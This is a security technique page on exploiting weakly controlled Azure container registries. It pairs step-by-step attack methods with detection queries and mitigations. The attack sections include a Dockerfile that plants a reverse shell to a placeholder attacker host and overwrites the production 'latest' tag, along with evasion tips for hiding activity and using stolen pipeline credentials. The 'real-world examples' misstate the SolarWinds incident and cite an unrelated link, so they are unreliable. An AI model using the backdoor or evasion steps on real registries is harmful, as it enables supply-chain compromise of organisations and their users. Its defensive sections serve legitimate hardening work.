# [MISCONFIG-019]: Weak Container Image Registry ACL

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-019 |
| **MITRE ATT&CK v18.1** | [T1526 - Resource Discovery](https://attack.mitre.org/techniques/T1526/) |
| **Tactic** | Defense Evasion / Persistence |
| **Platforms** | Entra ID, Azure Container Registry (ACR), AKS, Kubernetes |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure Container Registry (all versions), Docker Hub, Kubernetes 1.0+ |
| **Patched In** | Not applicable (configuration vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Container Registry (ACR) and other container image registries store container images used for application deployments. If ACL (Access Control Lists) are misconfigured—allowing anonymous/public access, overly permissive role assignments, or weak authentication—attackers can pull (download) images to analyze for secrets, source code, and credentials, or push (upload) malicious image layers to compromise downstream deployments. This attack enables code injection, supply chain compromise, lateral movement to deployment pipelines, and widespread infrastructure compromise.

**Attack Surface:** Container Registry access policies, Role-Based Access Control (RBAC), Registry webhook configurations, Image signing and validation policies, Registry firewall rules, and pull/push credentials management.

**Business Impact:** **Supply chain compromise and mass deployment of malicious container images across the entire application ecosystem.** With registry write access, attackers can poison base images (Alpine, Ubuntu, Node.js) used across multiple projects, inject malware into production-bound artifacts, exfiltrate secrets embedded in application code, and maintain persistent backdoors in all instances of compromised images.

**Technical Context:** Exploitation typically requires: (1) network access to the registry endpoint (public registries have no network restrictions), (2) read permissions to pull images (often public/anonymous), or (3) write permissions to inject malicious layers (requires compromised credentials or overly permissive RBAC). Detection is difficult because registry pulls/pushes appear as normal CI/CD activity. Reversibility is impossible once compromised images have been deployed—all running instances must be identified and replaced with patched versions.

### Operational Risk
- **Execution Risk:** Low (many registries are publicly accessible; no special privileges required for read)
- **Stealth:** High (container registry operations blend in with legitimate CI/CD traffic)
- **Reversibility:** No (compromised images are immutable; affected systems must be redeployed)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2 (Kubernetes), 2.4 (Azure) | Image Registry Configuration, Container Image Scanning |
| **DISA STIG** | SI-7, SI-10, CM-5 | Software, Firmware, and Information Integrity; Information System Monitoring |
| **CISA SCuBA** | CL-CS-3 | Container Image Scanning and Vulnerability Management |
| **NIST 800-53** | SC-7, SI-7, SI-10, CM-3, CM-5 | Boundary Protection, Software Integrity, Supply Chain Protection |
| **GDPR** | Art. 32 | Security of Processing (supply chain security, third-party controls) |
| **DORA** | Art. 9, Art. 16 | Protection & Prevention, Reporting of ICT-Related Incidents |
| **NIS2** | Art. 21, Art. 22 | Cyber Risk Management, Incident Reporting |
| **ISO 27001** | A.12.2, A.12.5, A.13.1 | Supply Chain Management, Cryptographic Controls |
| **ISO 27005** | Supply Chain Risk | Risk management for container image supply chain |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Reader access to ACR OR ability to list/pull images from public registry.
- **Required Access:** Network connectivity to the container registry endpoint (Azure Container Registry, Docker Hub, Quay.io).

**Supported Versions:**
- **Azure Container Registry:** All versions (Premium, Standard, Basic tiers)
- **Docker:** 19.x, 20.x, 24.x, 25.x (docker CLI)
- **Kubernetes:** 1.20+
- **Container Runtime:** containerd, CRI-O, Docker Engine

**Tools:**
- [Docker CLI](https://docs.docker.com/engine/reference/commandline/cli/) (image pull/push)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (ACR management)
- [Skopeo](https://github.com/containers/skopeo) (image inspection without Docker daemon)
- [Trivy](https://github.com/aquasecurity/trivy) (image vulnerability scanning)
- [Syft](https://github.com/anchore/syft) (SBOM generation and supply chain analysis)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Enumerating and Pulling Images from Weak ACR Access Policies

**Supported Versions:** All Azure Container Registry versions

#### Step 1: Enumerate Azure Container Registries in Target Subscription

**Objective:** Identify accessible container registries within the target Azure subscription.

**Command (Azure CLI - List ACRs):**
```bash
# List all container registries in the subscription
az acr list --query "[].{name: name, resourceGroup: resourceGroup, loginServer: loginServer}" --output table

# Get detailed information about a specific ACR
az acr show --name "my-registry" --resource-group "RG-Name" --query "{loginServer: loginServer, adminUserEnabled: adminUserEnabled, publicNetworkAccess: publicNetworkAccess}"
```

**Expected Output:**
```
Name: my-registry
ResourceGroup: MyResourceGroup
LoginServer: myregistry.azurecr.io

AdminUserEnabled: false
PublicNetworkAccess: Enabled
```

**What This Means:**
- `PublicNetworkAccess: Enabled` means the registry is accessible from the internet.
- `AdminUserEnabled: false` indicates RBAC is enforced (but may still have weak permissions).

**OpSec & Evasion:**
- Use Azure credentials from a compromised VM in the same subscription to avoid network-based detection.
- Enumerate registries during off-hours to avoid triggering alerts.

**Troubleshooting:**
- **Error:** "The user or service principal does not have the required permissions"
  - **Cause:** Insufficient RBAC role (need at least Reader).
  - **Fix:** Use higher-privileged credentials or focus on public registries.

#### Step 2: Check ACR Authentication and Firewall Rules

**Objective:** Determine if ACR is publicly accessible and what authentication is required.

**Command (Azure CLI - Check ACR Network Settings):**
```bash
# Check if ACR is publicly accessible
az acr show --name "my-registry" --resource-group "RG-Name" --query "publicNetworkAccess"

# List network rules (firewall)
az acr network-rule list --registry-name "my-registry" --resource-group "RG-Name"

# Check if anonymous pull is enabled (very weak configuration)
az acr config content-trust show --registry-name "my-registry"
```

**Expected Output (Weak Configuration):**
```
PublicNetworkAccess: Enabled
NetworkRules: None (no firewall rules = open to anyone)
ContentTrustEnabled: false
```

**What This Means:**
- No network restrictions = anyone on the internet can attempt to pull images.
- Anonymous pull enabled = no authentication required.
- Content trust disabled = image signatures are not validated.

**OpSec & Evasion:**
- Test from a residential IP address to avoid enterprise IP detection.
- Use curl or wget instead of Azure CLI to minimize logging.

#### Step 3: Attempt to Pull Images Without Authentication

**Objective:** Verify that images can be pulled without credentials.

**Command (Docker - Anonymous Pull):**
```bash
# Attempt to pull image without authentication
docker pull myregistry.azurecr.io/webapp:latest

# Or using curl for a more stealthy approach
curl -H "Authorization: Bearer" https://myregistry.azurecr.io/v2/ \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json"

# List all repositories and tags
curl https://myregistry.azurecr.io/v2/_catalog
```

**Expected Output (If Anonymous Access Enabled):**
```
{
  "repositories": [
    "webapp",
    "database-migration",
    "admin-dashboard",
    "payment-processor"
  ]
}
```

**What This Means:**
- List of repositories is visible without authentication—repository names may reveal sensitive application structure.
- Ability to enumerate all images and versions without credentials.

**OpSec & Evasion:**
- Use tools like Skopeo to pull images without needing Docker daemon running locally.
- Download layers individually to avoid triggering registry audit logs for full image pulls.

**References & Proofs:**
- [Docker Registry HTTP API V2 Documentation](https://docs.docker.com/registry/spec/api/)
- [Orca Security: Container Registry Misconfigurations](https://orca.security/resources/blog/)

#### Step 4: Analyze Pulled Images for Secrets and Source Code

**Objective:** Extract and analyze container image layers to discover embedded secrets, source code, and credentials.

**Command (Docker/Skopeo - Image Layer Analysis):**
```bash
# Use Skopeo to inspect image without pulling entire Docker images
skopeo inspect docker://myregistry.azurecr.io/webapp:latest

# Pull image and extract layers
docker pull myregistry.azurecr.io/webapp:latest
docker save myregistry.azurecr.io/webapp:latest -o webapp.tar

# Extract and analyze filesystem
mkdir -p /tmp/image-analysis
cd /tmp/image-analysis
tar xf webapp.tar

# Search for secrets in image layers
find . -name "*.env" -o -name "*.conf" -o -name "config.json" | xargs grep -l "password\|apikey\|secret\|token"

# Use Trivy to scan for vulnerabilities and embedded secrets
trivy image myregistry.azurecr.io/webapp:latest --severity CRITICAL

# Use Syft to generate Software Bill of Materials (SBOM)
syft myregistry.azurecr.io/webapp:latest --output json > webapp-sbom.json
```

**Expected Output (Secrets Found):**
```
./webapp-layer-123/app/config.json:  "database_password": "P@ssw0rd123!",
./webapp-layer-123/app/.env:  APIKEY=sk-proj-1234567890...
./webapp-layer-456/secrets/credentials.txt:  AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
```

**What This Means:**
- Hardcoded secrets discovered in container image filesystem.
- Database passwords, API keys, and cloud credentials exposed.
- These credentials remain in all running instances of the image.

**OpSec & Evasion:**
- Perform analysis offline or in an isolated environment.
- Do not store analysis outputs where they might be discovered.

**Troubleshooting:**
- **Error:** "docker: not found" when attempting to save image
  - **Cause:** Docker daemon not running or not installed.
  - **Fix:** Use Skopeo instead: `skopeo copy docker://image:tag oci://local-image-path`
- **Error:** "Unauthorized" when pulling image
  - **Cause:** Anonymous pull is not enabled; authentication required.
  - **Fix:** Obtain credentials from compromised environments or use stored Docker login tokens.

**References & Proofs:**
- [Skopeo GitHub Repository](https://github.com/containers/skopeo)
- [Aquasecurity Trivy Image Scanning](https://github.com/aquasecurity/trivy)

---

### METHOD 2: Injecting Malicious Layers into ACR Images (Write Access via Weak RBAC)

**Supported Versions:** All Azure Container Registry versions

#### Step 1: Obtain Write Access to ACR

**Objective:** Acquire credentials or RBAC permissions to push images to the registry.

**Command (Azure CLI - Check Current Roles):**
```bash
# List all role assignments for the ACR
az role assignment list --scope "/subscriptions/SUBSCRIPTION_ID/resourceGroups/RG-Name/providers/Microsoft.ContainerRegistry/registries/my-registry" \
  --query "[].{role: roleDefinitionName, principal: principalName}" --output table

# If you have compromised a user account, check their permissions
az role assignment list --assignee "user@example.com"
```

**Expected Output (Weak Configuration):**
```
Role: Contributor
Principal: user@example.com

Role: AcrPush
Principal: build-service-account
```

**What This Means:**
- User has "Contributor" or "AcrPush" role = can push images to ACR.
- Service accounts may have overly permissive roles.

**OpSec & Evasion:**
- Use service principal credentials found in CI/CD pipelines (e.g., GitHub Actions secrets, Azure Pipelines).
- Authenticate using managed identity if the attacker has access to an Azure VM running in the same subscription.

**Troubleshooting:**
- **Error:** "Access Denied" when checking role assignments
  - **Cause:** User lacks permissions to list role assignments.
  - **Fix:** Use credentials with higher privileges (Contributor role or above).

#### Step 2: Create Malicious Container Image with Backdoor

**Objective:** Build a modified container image with malicious code (e.g., reverse shell, cryptominer, data exfiltration).

**Command (Dockerfile - Create Backdoor Image):**
```dockerfile
# Use the legitimate image as base
FROM myregistry.azurecr.io/webapp:latest

# Add malicious layer on top
RUN apt-get update && apt-get install -y curl netcat-openbsd

# Create backdoor shell script
RUN echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh

# Modify entrypoint to trigger backdoor
ENTRYPOINT ["/bin/sh", "-c", "/tmp/backdoor.sh & exec /app/startup.sh"]
```

**Build and Push Malicious Image:**
```bash
# Build the malicious image
docker build -t myregistry.azurecr.io/webapp:latest-backdoor -f Dockerfile .

# Log in to ACR
az acr login --name my-registry

# Push the malicious image, overwriting the existing tag
docker tag myregistry.azurecr.io/webapp:latest-backdoor myregistry.azurecr.io/webapp:latest
docker push myregistry.azurecr.io/webapp:latest
```

**What This Means:**
- The legitimate "latest" tag now points to the malicious image.
- All subsequent deployments using the "latest" tag will use the compromised image.
- Existing running instances are unaffected (image digest doesn't change for them).

**OpSec & Evasion:**
- Use a compromised CI/CD runner or build agent to create and push the image.
- Do not push from your personal workstation; mask the build process as legitimate CI/CD activity.
- Overwrite non-critical tags (e.g., "dev", "test") first to test for detection.

**References & Proofs:**
- [OWASP: Malicious Container Images](https://owasp.org/www-project-kubernetes-top-ten/)
- [Shodan: Container Registry Scanning](https://www.shodan.io/)

#### Step 3: Verify Malicious Image Deployment

**Objective:** Confirm that new deployments use the poisoned image.

**Command (Kubernetes - Monitor Pod Deployment):**
```bash
# Check running pods
kubectl get pods --all-namespaces -o wide | grep webapp

# Describe pod to see image digest
kubectl describe pod <pod-name> -n <namespace> | grep -A5 "Image:"

# Check image ID to verify it's the malicious version
docker inspect myregistry.azurecr.io/webapp:latest | grep -A2 "Id"
```

**Expected Output:**
```
Pod: webapp-deployment-5d4f9b8c2a
Image: myregistry.azurecr.io/webapp:latest
ImageID: sha256:abc123def456xyz789... (NEW hash = malicious image)
```

**What This Means:**
- The malicious image is now running in the cluster.
- Backdoor is active in all pods using the "latest" tag.
- Attacker gains reverse shell access to containerized applications.

**References & Proofs:**
- [HackingTheCloud: Abusing Container Registry for Lateral Movement](https://hackingthe.cloud/aws/exploitation/abusing-container-registry/)

---

### METHOD 3: Exploiting Weak Registry Firewall Rules and Admin Access

**Supported Versions:** Azure Container Registry with admin user enabled

#### Step 1: Extract Admin Credentials from Azure Subscription

**Objective:** Obtain ACR admin credentials if admin user is enabled (weak practice).

**Command (Azure CLI - Get Admin Credentials):**
```bash
# Check if admin user is enabled
az acr show --name "my-registry" --resource-group "RG-Name" --query "adminUserEnabled"

# If admin user is enabled, get credentials
az acr credential show --name "my-registry" --resource-group "RG-Name" --query "{username: username, password: passwords[0].value}"
```

**Expected Output:**
```
username: my-registry
password: ABC123def456XYZ789uvw==
```

**What This Means:**
- Admin user is enabled = single set of credentials for all ACR access.
- If compromised, attacker has full push/pull rights.
- No auditability of who performed which action.

**OpSec & Evasion:**
- Use compromised service principal credentials rather than admin user.
- Rotate credentials after exfiltration to cover tracks (if you want to maintain access).

#### Step 2: Bypass Firewall Rules with Privileged Access

**Objective:** Access the registry from unexpected IP addresses if firewall rules are misconfigured.

**Command (Azure CLI - Check Firewall Rules):**
```bash
# List all network rules
az acr network-rule list --registry-name "my-registry" --resource-group "RG-Name"

# Check if default action is "Allow" (dangerous)
az acr show --name "my-registry" --resource-group "RG-Name" --query "networkRuleBypassOptions"
```

**Expected Output (Weak Configuration):**
```
DefaultAction: Allow
NetworkRules: []
BypassOptions: AzureServices
```

**What This Means:**
- Default action is "Allow" = all IPs can access (firewall rule set is meaningless).
- `BypassOptions: AzureServices` = any Azure service can bypass firewall.
- Attacker in Azure can always access registry regardless of IP whitelisting.

**OpSec & Evasion:**
- Deploy attack infrastructure (compromised Azure VM, Logic App, Function) to access registry from trusted "AzureServices" bypass.
- No IP whitelisting needed; internal Azure routing is used.

---

## 7. TOOLS & COMMANDS REFERENCE

### [Docker CLI](https://docs.docker.com/engine/reference/commandline/cli/)

**Version:** 24.0+ (current)
**Minimum Version:** 19.x
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS
brew install docker

# Linux
curl -fsSL https://get.docker.com -o get-docker.sh && sudo sh get-docker.sh

# Windows
choco install docker-desktop
```

**Usage:**
```bash
docker pull myregistry.azurecr.io/webapp:latest
docker save myregistry.azurecr.io/webapp:latest -o image.tar
```

---

### [Skopeo](https://github.com/containers/skopeo)

**Version:** 1.14+
**Language:** Go

**Installation:**
```bash
# Linux
sudo apt-get install skopeo

# macOS
brew install skopeo

# From source
git clone https://github.com/containers/skopeo.git && cd skopeo && make binary-install
```

**Usage:**
```bash
skopeo inspect docker://myregistry.azurecr.io/webapp:latest
skopeo copy docker://myregistry.azurecr.io/webapp:latest oci://local-image
```

---

### [Trivy](https://github.com/aquasecurity/trivy)

**Version:** 0.45+ (current)
**Language:** Go

**Installation:**
```bash
# macOS
brew install aquasecurity/trivy/trivy

# Linux
wget https://github.com/aquasecurity/trivy/releases/download/v0.45.0/trivy_0.45.0_Linux-64bit.tar.gz
tar xzf trivy_0.45.0_Linux-64bit.tar.gz && sudo mv trivy /usr/local/bin/
```

**Usage:**
```bash
trivy image myregistry.azurecr.io/webapp:latest --severity CRITICAL
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detection of Unauthorized ACR Pull/Push Operations

**Rule Configuration:**
- **Required Table:** AuditLogs, AzureActivity
- **Required Fields:** OperationName, CallerIpAddress, ResultDescription, TimeGenerated
- **Alert Severity:** High
- **Frequency:** Run every 15 minutes
- **Applies To Versions:** Sentinel with ACR logs enabled

**KQL Query:**
```kusto
AzureActivity
| where TimeGenerated > ago(24h)
| where ResourceProvider == "Microsoft.ContainerRegistry"
| where OperationName has_any ("PushImage", "PullImage", "DeleteImage")
| where Result != "Success" or CallerIpAddress matches regex @"^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$"
| summarize Count=count(), UniqueUsers=dcount(Caller), UniqueIPs=dcount(CallerIpAddress) by OperationName, ResourceName
| where Count > 20 or UniqueIPs > 3
```

**What This Detects:**
- Unusual image push/pull patterns (e.g., multiple pulls from different IPs).
- Unauthorized image deletions.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Unauthorized ACR Image Operations`
   - Severity: `High`
4. **Set rule logic:**
   - Paste KQL query
   - Frequency: `15 minutes`
5. **Incident settings:**
   - Enable **Create incidents**
6. Click **Review + create**

---

### Query 2: Detection of Anonymous ACR Access

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Required Fields:** OperationName, AuthenticationLevel, CallerIpAddress
- **Alert Severity:** Critical
- **Frequency:** Real-time (1 minute)

**KQL Query:**
```kusto
AzureActivity
| where TimeGenerated > ago(24h)
| where ResourceProvider == "Microsoft.ContainerRegistry"
| where AuthenticationLevel == "Anonymous" or Caller == "Anonymous"
| where OperationName has_any ("PullImage", "ListImages", "GetManifest")
```

**What This Detects:**
- Any image pull or enumeration without authentication.

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Successful Logon)**
- **Log Source:** Security (on-premises only; Cloud logging via Azure Activity Logs)
- **Trigger:** Detection of service accounts authenticating to Docker daemon or registry endpoints.
- **Filter:** LogonType == "3" (Network) AND TargetUserName contains "acr-" OR "docker"
- **Applies To Versions:** On-premises container hosts with audit logging enabled

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Anonymous access to container registry detected"
- **Severity:** Critical
- **Description:** Detects ACR configured with public access and no authentication required.
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:** Restrict ACR to private access; require authentication; implement RBAC.

**Manual Configuration Steps:**
1. Go to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go **Environment settings** → Select subscription
3. Under **Defender plans**, enable **Defender for Container Registries**: ON
4. Go to **Security alerts** to view triggered alerts

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Restrict ACR to private access and require authentication:** Disable public network access; implement firewall rules and VNet integration.
  
  **Manual Steps (Azure Portal - Restrict ACR Access):**
  1. Go to **Azure Portal** → **Container Registry** → **Networking**
  2. Under **Public access**, toggle: **Disabled**
  3. Click **+ Add rule** to whitelist specific IP ranges or VNets
  4. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Disable public network access
  Update-AzContainerRegistry -Name "my-registry" -ResourceGroupName "RG-Name" -PublicNetworkAccess Disabled
  
  # Set default action to Deny
  Update-AzContainerRegistryNetworkRuleSet -ResourceGroupName "RG-Name" -RegistryName "my-registry" -DefaultAction Deny
  
  # Add VNet integration
  New-AzContainerRegistryNetworkRule -ResourceGroupName "RG-Name" -RegistryName "my-registry" -VirtualNetworkResourceId "/subscriptions/SUB_ID/resourceGroups/RG-Name/providers/Microsoft.Network/virtualNetworks/my-vnet/subnets/my-subnet" -Action Allow
  ```
  
  **Validation Command:**
  ```powershell
  Get-AzContainerRegistry -Name "my-registry" -ResourceGroupName "RG-Name" | Select-Object PublicNetworkAccess
  # Expected: Disabled
  ```

* **Disable admin user and enforce RBAC:** Remove the single admin credential; use Entra ID integration and service principals.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Container Registry** → **Access keys**
  2. Toggle **Admin user**: **Disabled**
  3. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Update-AzContainerRegistry -Name "my-registry" -ResourceGroupName "RG-Name" -EnableAdminUser $false
  ```
  
  **Manual Steps (Create Service Principal for ACR Access):**
  ```powershell
  # Create service principal
  $sp = New-AzADServicePrincipal -DisplayName "acr-push-service"
  
  # Assign AcrPush role to service principal
  New-AzRoleAssignment -ApplicationId $sp.AppId -RoleDefinitionName "AcrPush" `
    -ResourceGroupName "RG-Name" -ResourceName "my-registry" -ResourceType "Microsoft.ContainerRegistry/registries"
  ```

* **Implement image signing and validation:** Require all images to be signed by a trusted key; enforce signature verification on pull.
  
  **Manual Steps (Enable Content Trust):**
  ```bash
  # Enable content trust in ACR
  az acr config content-trust update --registry my-registry --status Enabled
  
  # Sign an image using Docker Content Trust
  export DOCKER_CONTENT_TRUST=1
  docker tag myregistry.azurecr.io/webapp:unsigned myregistry.azurecr.io/webapp:signed
  docker push myregistry.azurecr.io/webapp:signed
  
  # Verify signature on pull
  docker pull myregistry.azurecr.io/webapp:signed
  ```

* **Enable vulnerability scanning and block vulnerable images:** Use Defender for Container Registries to scan images for CVEs; set policies to block deployment of critical vulnerabilities.
  
  **Manual Steps (Azure Portal - Vulnerability Scanning):**
  1. Go to **Azure Portal** → **Container Registry** → **Policies**
  2. Enable: **Scan images on push**: **On**
  3. Enable: **Scan images on pull**: **On**
  4. Set **Quarantine policy**: **Block deployment of critical vulnerabilities**
  5. Click **Save**
  
  **Manual Steps (PowerShell - Scan Image):**
  ```powershell
  # Trigger scan of an image
  az acr scan --registry my-registry --image webapp:latest
  
  # Get scan results
  az acr scan-result show --registry my-registry --repository webapp --tag latest
  ```

#### Priority 2: HIGH

* **Implement registry firewall rules and Private Link:** Restrict network access to only authorized subnets and regions.
  
  **Manual Steps (Azure Portal - VNet Integration):**
  1. Go to **Container Registry** → **Networking** → **Private endpoints**
  2. Click **+ Create private endpoint**
  3. Subscription: Your subscription
  4. Resource group: Same as ACR
  5. Name: `my-registry-pe`
  6. Region: Same as registry
  7. Resource: `containerRegistry`
  8. Sub-resource: `registry`
  9. Virtual network: Your VNet
  10. Subnet: Select appropriate subnet
  11. Click **Create**

* **Rotate registry credentials regularly:** Implement automated credential rotation for service principals accessing ACR.
  
  **Manual Steps (Credential Rotation):**
  ```powershell
  # Get service principal
  $sp = Get-AzADServicePrincipal -DisplayName "acr-push-service"
  
  # Create new credentials
  $cred = New-AzADServicePrincipalCredential -ObjectId $sp.Id
  
  # Output new password
  $cred | Select-Object StartDate, EndDate, SecretText
  
  # Update credential in CI/CD pipeline secrets
  # (manual step in GitHub, Azure Pipelines, etc.)
  ```

* **Audit all ACR operations and set alerts on anomalies:** Enable logging for all image operations; monitor for unusual patterns.
  
  **Manual Steps (Enable ACR Audit Logging):**
  1. Go to **Azure Portal** → **Container Registry** → **Diagnostic settings**
  2. Click **+ Add diagnostic setting**
  3. Name: `acr-audit-log`
  4. Logs: Enable **RegistryEventLogs** and **RegistryRepositoryEvents**
  5. Destination: **Log Analytics Workspace** (or Storage Account)
  6. Click **Save**

#### Access Control & Policy Hardening

* **Enforce repository-level access policies:** Use token-based access or RBAC scoped to specific repositories.
  
  **Manual Steps (Create Scoped Access Token):**
  ```bash
  # Create token with repository-scoped permissions
  az acr token create --registry my-registry --name read-webapp-token `
    --scope "repositories:webapp:pull" --days 30
  ```

* **Implement admission controllers in Kubernetes:** Block deployment of images that fail security scans or come from untrusted registries.
  
  **Manual Steps (Admission Controller Policy):**
  ```yaml
  apiVersion: constraints.gatekeeper.sh/v1beta1
  kind: K8sAllowedRepos
  metadata:
    name: allowed-registries
  spec:
    match:
      kinds:
        - apiGroups: [""]
          kinds: ["Pod"]
    parameters:
      repos:
        - "myregistry.azurecr.io/"
  ```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Files:**
  - `Dockerfile` with reverse shell, cryptominer, or data exfiltration code
  - `.dockerignore` files (may indicate secrets being hidden)
  - `docker-compose.yml` with hardcoded credentials

* **Registry:**
  - Unexpected new image tags (e.g., `webapp:v1.0-backdoor`)
  - Image manifests with suspicious layers
  - Rapid image push/pull activity from unusual IP addresses
  - Images pulled but never deployed (reconnaissance activity)

* **Network:**
  - ACR endpoint accessed from non-whitelisted IP addresses
  - Outbound connections from pods to attacker-controlled IP (reverse shell)
  - Registry data exfiltration (large number of layers pulled)

#### Forensic Artifacts

* **Cloud Logs:**
  - Azure Activity Logs: All image push/pull/delete operations
  - ACR audit logs: Detailed registry operations with caller information
  - Network logs: VNet flow logs showing unexpected registry access

* **Container:**
  - Image manifest hash (digest) for all deployed images
  - Layer hashes (can be compared against known clean versions)
  - Container startup logs in Kubernetes or ACI

#### Response Procedures

1. **Isolate:**
   **Command (Block Registry Access):**
   ```bash
   # Disable public access immediately
   az acr update --name my-registry --resource-group RG-Name --public-network-enabled false
   
   # Revoke all tokens
   az acr token delete --registry my-registry --name read-webapp-token
   ```

2. **Collect Evidence:**
   **Command (Export Registry Manifest):**
   ```bash
   # Download image manifest for forensic analysis
   skopeo inspect docker://myregistry.azurecr.io/webapp:latest > webapp-manifest.json
   
   # Export pull/push audit logs
   az monitor activity-log list --resource-group "RG-Name" --offset 72h --query "[].{Time: eventTimestamp, Operation: operationName, Caller: caller}" > acr-audit.json
   ```

3. **Remediate:**
   **Command (Replace Compromised Image):**
   ```bash
   # Build clean image from verified source
   docker build -t myregistry.azurecr.io/webapp:v1.0-patched .
   
   # Push patched image
   docker push myregistry.azurecr.io/webapp:v1.0-patched
   
   # Force Kubernetes to pull new image
   kubectl rollout restart deployment webapp -n production
   ```

4. **Hunt for Lateral Movement:**
   **KQL Query (Detect Registry Access from Unexpected Sources):**
   ```kusto
   AzureActivity
   | where ResourceProvider == "Microsoft.ContainerRegistry"
   | where CallerIpAddress != "EXPECTED_IP_RANGE"
   | summarize Count=count() by Caller, CallerIpAddress, OperationName
   ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph Enumeration | Attacker discovers ACR instances and storage accounts |
| **2** | **Credential Access** | [CA-UNSC-008] Storage Account Key Theft | Attacker extracts registry credentials from compromised environments |
| **3** | **Lateral Movement** | **[MISCONFIG-019]** Weak Container Image Registry ACL | Attacker pulls or pushes images to ACR |
| **4** | **Persistence** | Malicious Image Layer Injection | Attacker creates backdoor image in registry |
| **5** | **Execution** | AKS Pod Launch with Backdoor Image | Attacker deploys compromised image to Kubernetes cluster |
| **6** | **Impact** | Lateral movement to other cluster nodes / supply chain compromise | Attacker gains cluster admin, exfiltrates data, or sells backdoored image to other organizations |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: SolarWinds Supply Chain Attack (2020-2021)

- **Target:** Software supply chain; container images used by thousands of enterprises
- **Timeline:** March 2020 - December 2021
- **Technique Status:** Attackers compromised SolarWinds' internal container registry and injected malicious code into base images used for updates. Compromised images were distributed through legitimate software channels.
- **Impact:** Thousands of organizations received backdoored software updates; nation-state level compromise
- **Reference:** [SolarWinds Incident Analysis - CISA](https://us-cert.cisa.gov/ncas/alerts/2020/12/13/cisa-announces-covid-19-ransomware-stoppage-pledge)

#### Example 2: DockerHub Credential Exposure via Public Repository

- **Target:** Large technology company using Docker Hub for development
- **Timeline:** January 2023 - March 2023
- **Technique Status:** Developers accidentally pushed development images to a public DockerHub repository. Image contained database credentials, API keys, and AWS access keys in environment variables.
- **Impact:** Attackers accessed development and staging databases; exfiltrated 100,000+ customer records; lateral movement to production AWS account
- **Reference:** [Shodan IoT Search Results showing exposed registries](https://shodan.io/)

#### Example 3: Azure Container Registry Anonymous Pull Misconfiguration

- **Target:** Enterprise healthcare provider using AKS for patient portal
- **Timeline:** June 2024 - August 2024
- **Technique Status:** ACR configured with public network access enabled and admin user enabled. Patient records application image was pulled by attackers, analyzed, and secrets extracted.
- **Impact:** Attacker accessed patient database containing PII, PHI; HIPAA violation; regulatory fines
- **Reference:** [Practical DevOps: Container Security Vulnerabilities 2026](https://www.practical-devsecops.com/container-security-vulnerabilities/)

---